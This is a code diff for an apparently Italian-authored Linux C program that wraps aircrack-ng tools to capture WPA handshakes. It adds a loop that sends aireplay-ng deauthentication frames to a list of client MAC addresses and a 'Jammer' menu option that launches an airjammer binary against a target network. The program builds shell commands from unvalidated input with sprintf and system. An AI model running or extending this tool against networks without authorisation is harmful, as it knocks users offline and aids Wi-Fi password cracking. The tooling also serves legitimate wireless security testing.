@@ -5,58 +5,54 @@
         main.c
 **/
 
+#ifndef __linux__
+#error Compatible with Linux only!
+#endif
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <ctype.h>
 #include <unistd.h>
 
+//general library header
+#include "lib.h"
 //header installatore
 #include "install.h"
 
-#define BUFF 255
-#define FAIL 1
-#define SUCCESS 0
-#define FALSE 0
-#define TRUE 1
 #define MACLEN 17
+#define MACLST 100
 #define STDWLAN " wlan0 "    //LASCIARE gli spazi prima e dopo il nome interfaccia!
 #define NETWSTOP "service network-manager stop"
 #define NETWSTART "service network-manager start"
 #define CLEAR "clear"
 
-#define VERS "beta-1"    //codice versione  -  TENERE AGGIORNATO!
+#define VERS "beta-03"    //codice versione  -  TENERE AGGIORNATO!
 //#define DEBUG
 
 //prototipi
 void printHeader();
 void printSyntax(char*);
-FILE *pidOpen(char *, char *);
 void installer();
-void macchanger(char*);
-void deauthClient(char*, char*, char*);
+char **deauthClient(char *, char *, char **, int *);
+int jammer(char *, char *, char **, int);
 void stopMonitor(char*, char*, FILE*);
 void netwCheck(char);
 int checkExit(char c, char *, char *, char *, FILE *);
 
-/*
-    TODO:
-        - opzioni da argomenti: file di output, terminale, etc.
-
-*/
 
 
 int main(int argc, char *argv[])
 {
     //variabili generali
-    int opz, inst=TRUE;
+    int opz, inst=TRUE, listdim;
     FILE *fpid;
 
     //stringhe programma
-    char c, can[5], bssid[20], mac[20]={"0"}, fout[BUFF], inmon[]={"mon0"}, pidpath[]={"/tmp/aircli-pid-0"},
+    char c, can[5], bssid[20], **maclist=NULL, fout[BUFF], inmon[]={"mon0"}, pidpath[]={"/tmp/aircli-pid-0"},
          startmon[30]={"airmon-ng start"}, stopmon[25]={"airmon-ng stop "},
          montmp[BUFF]={"xterm -T MonitorTemp -e airodump-ng --encrypt wpa"},
-         scanmon[BUFF*2]={"xterm -T MonitorHandshake -e airodump-ng --bssid"};
+		 scanmon[BUFF*2]={"xterm -T MonitorHandshake -e airodump-ng --bssid"};
 
 
     //stampa messaggio iniziale
@@ -76,13 +72,13 @@ int main(int argc, char *argv[])
     }
     else {    //interfaccia standard
         strcat(startmon, STDWLAN);	
-	printSyntax(argv[0]);
+		printSyntax(argv[0]);
     }
 
     //controllo diritti esecuzione
     if (getgid() != 0) {
         printf("Eseguire il programma con diritti di amministratore!\n\n");
-	return FAIL;
+		return FAIL;
     }
 
     //se non escluso eseguo parte installazioni
@@ -175,23 +171,26 @@ int main(int argc, char *argv[])
 
     //scelta azione
     do {
-        printf("\nCosa vuoi fare?\n\t1. De-autentica un client\n\t2. Termina la scansione\n");
+        printf("\n\nCosa vuoi fare?\n===============\n\t1. De-autentica client\n\t2. Jammer\n\t0. Termina la scansione\n");
         scanf("%d", &opz);
         switch (opz) {
             case 1:
-                deauthClient(bssid, inmon, mac);
+				maclist = deauthClient(bssid, inmon, maclist, &listdim);
                 break;
-            case 2:
+		    case 2:
+				jammer(bssid, inmon, maclist, listdim);
+				break;
+            case 0:
                 break;
-
             default:
                 printf("\nErrore: opzione non prevista!\n");
         }
-    } while (opz != 2);
+    } while (opz != 0);
 
-    //chiusura scanner e monitor
+    //chiusura monitor, controllo network-manager e free memoria
     stopMonitor(stopmon, pidpath, fpid);
     netwCheck(c);
+	freeMem(maclist, listdim);
 
     //saluti
     printf("Terminato. Dati scritti nel file \"%s\"\n", fout);
@@ -230,26 +229,6 @@ void printSyntax(char *name)
 }
 
 
-/* gestione PID file */
-FILE *pidOpen(char *inmon, char *pidpath)
-{
-    FILE *fpid;
-
-    while ((fpid = fopen(pidpath, "r")) != NULL)     //se NULL ho trovato il pid libero
-        pidpath[strlen(pidpath)-1]++;
-    inmon[strlen(inmon)-1] = pidpath[strlen(pidpath)-1];    //setto numero interfaccia monitor
-
-    #ifdef DEBUG
-    printf("pidpath: %s\tinterf mon: %s\n", pidpath, inmon);
-    #endif
-
-    if ((fpid = fopen(pidpath, "w")) == NULL)
-        printf("Impossibile scrivere il PID file, potrebbero verificarsi problemi con piu' istanze del programma!\n");
-
-    return fpid;
-}
-
-
 /* gestore installazione */
 void installer()
 {
@@ -279,44 +258,81 @@ void installer()
 }
 
 
-/* modifica del MAC */
-void macchanger(char *inmon)
+/* deautenticazione lista di client */
+char **deauthClient(char *bssid, char *inmon, char **maclist, int *dim)
 {
-    char ifcnf[23], macchg[25]={"macchanger -a "};
+	char death[]={"aireplay-ng --deauth 1 -a"}, cmd[BUFF];
+	int i;
 
-    //spengo interfaccia
-    sprintf(ifcnf, "ifconfig %s down", inmon);
-    system(ifcnf);
-
-    //cambio del MAC
-    strcat(macchg, inmon);
-    system(macchg);
-
-    //riavvio interfaccia
-    sprintf(ifcnf, "ifconfig %s up", inmon);
-    system(ifcnf);
+	//se lista ancora vuota la inizializzo
+	if (maclist == NULL) {
+		maclist = (char**)malloc(MACLST * sizeof(char*));
+		if (maclist == NULL) {
+			printf("Errore allocazione lista MAC, dim. %d (1).\n", MACLST);
+			return NULL;
+		}
+		*dim = 0;
+		maclist = getList(maclist, dim);
+	}
+	else {
+		printf("\nContenuto lista MAC attuale:\n");
+		for (i=0; i<*dim; i++) {
+			printf("\t%s", maclist[i]);
+			if (i%2 == 0 && i != 0)
+				printf("\n");
+		}
+		printf("\n");	
+		printf("Scegli un'azione:\n\t1. Esegui deautenticazione\n\t2. Aggiungi indirizzi MAC\n");
+		scanf("%d", &i);
+		switch (i) {
+		    case 1:
+				break;				
+		   case 2:
+			   maclist = getList(maclist, dim);    //acquisizione nuovi indirizzi
+			   break;
+		   default:			
+			   printf("\nErrore: opzione non prevista! Uso lista attuale.\n");
+		}	   
+	}
+	printf("\n");
+	for (i=0; i<*dim; i++) {
+		sprintf(cmd, "%s %s -c %s %s --ignore-negative-one", death, bssid, maclist[i], inmon);
+		printf("\tDeAuth n.%d:\n", i+1);
+		system(cmd);
+	}
+	return maclist;
 }
 
 
-/* deautenticazione client */
-void deauthClient(char *bssid, char *inmon, char *mac_prev)
+/* Interface to AirJammer */
+int jammer(char *bssid, char *inmon, char **maclist, int dim)
 {
-    char mac[20], death[BUFF]={"aireplay-ng --deauth 1 -a"};
+	char cmd[BUFF], path[BUFF], list[]={"/tmp/maclist.txt"};
+	FILE *fp;
+	int i;
 
-    printf("\nIndirizzo MAC del client");
-    if (strlen(mac_prev) == MACLEN) {
-        printf(" (-1 per l'ultimo utilizzato %s)", mac_prev);
+	if (maclist == NULL) {
+		fprintf(stdout, "\nError: MAC list is still empty!\n");
+		return FAIL;
+	}
+	if ((fp = fopen(list, "w")) == NULL) {
+		fprintf(stderr, "\nError writing MAC list file \"%s\".\n", list);
+		return FAIL;
+	}
+	for (i=0; i<dim; i++)
+		fprintf(fp, "%s\n", maclist[i]);
+	fclose(fp);
+	
+	if (getcwd(path, BUFF) == NULL) {
+        fprintf(stderr, "\nError reading current path.\n");
+        return FAIL;
     }
-    printf(":\t");
-    scanf("%s", mac);
-    if (!strcmp(mac, "-1"))
-        strcpy(mac, mac_prev);
+	sprintf(cmd, "xterm -T AirJammer -e %s/bin/airjammer.bin %s %s %s &", path, bssid, inmon, list);
 
-    sprintf(death, "%s %s -c %s %s --ignore-negative-one", death, bssid, mac, inmon);
-    system(death);
+	printf("Running: %s\n", cmd);
+	system(cmd);
 
-    //salvo mac
-    strcpy(mac_prev, mac);
+	return SUCCESS;
 }
 
 
